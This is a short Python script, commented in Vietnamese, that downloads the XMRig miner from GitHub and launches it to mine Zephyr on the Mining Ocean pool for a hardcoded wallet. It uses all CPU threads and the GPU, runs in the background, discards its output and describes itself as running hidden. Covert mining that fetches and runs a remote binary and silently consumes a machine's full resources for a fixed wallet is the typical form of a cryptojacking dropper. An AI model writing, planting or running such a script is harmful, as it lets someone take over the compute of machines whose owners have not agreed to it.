__author__ = 'root'
import subprocess
import os
import requests
import tempfile
import shutil
import tarfile

def install_xmrig():
    # Tải xuống xmrig từ trang web chính thức
    url = "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz"
    temp_dir = tempfile.mkdtemp()
    tar_filename = os.path.join(temp_dir, "xmrig.tar.gz")

    try:
        # Tải xuống tệp tar.gz chứa xmrig
        response = requests.get(url)
        with open(tar_filename, 'wb') as f:
            f.write(response.content)

        # Giải nén tệp tar.gz
        with tarfile.open(tar_filename, 'r:gz') as tar:
            tar.extractall(path=temp_dir)

        # Đường dẫn đến thư mục chứa xmrig
        xmrig_dir = os.path.join(temp_dir, "xmrig-6.21.3")

        # Di chuyển xmrig đến thư mục hiện tại
        shutil.move(os.path.join(xmrig_dir, "xmrig"), "./xmrig")
    except Exception as e:
        print(f"Lỗi khi tải xuống và cài đặt xmrig: {e}")
    finally:
        # Xóa thư mục tạm thời
        shutil.rmtree(temp_dir)

def start_mining():
    # Cài đặt xmrig nếu chưa có
    install_xmrig()

    # Đường dẫn đến chương trình xmrig
    xmrig_path = "./xmrig"

    # Cấu hình đào coin Zephyr trên CPU và GPU với Mining Ocean
    command = [
        xmrig_path,
        "--algo=zephyr",
        "--url=stratum+tcp://sg-zephyr.miningocean.org:5432",  # Thay thế bằng địa chỉ và cổng của Mining Ocean
        "--user=ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB",  # Thay thế bằng địa chỉ ví của bạn trên Mining Ocean
        "--pass=x",  # Thay thế bằng mật khẩu (nếu có)
        "--threads=0",  # Sử dụng tất cả các luồng CPU có sẵn cho đào mỏ
        "--opencl",  # Sử dụng GPU để đào mỏ bằng OpenCL
        "--donate-level=0",  # Không donate
        "--background"  # Chạy xmrig ẩn danh
    ]

    try:
        # Tạo một môi trường ẩn danh để chạy xmrig
        devnull = open(os.devnull, 'w')
        subprocess.Popen(command, stdout=devnull, stderr=devnull)
        print("Đang khởi động xmrig để đào Zephyr trên CPU và GPU ẩn...")
    except Exception as e:
        print(f"Lỗi khi khởi động xmrig: {e}")
    finally:
        devnull.close()

if __name__ == "__main__":
    start_mining()
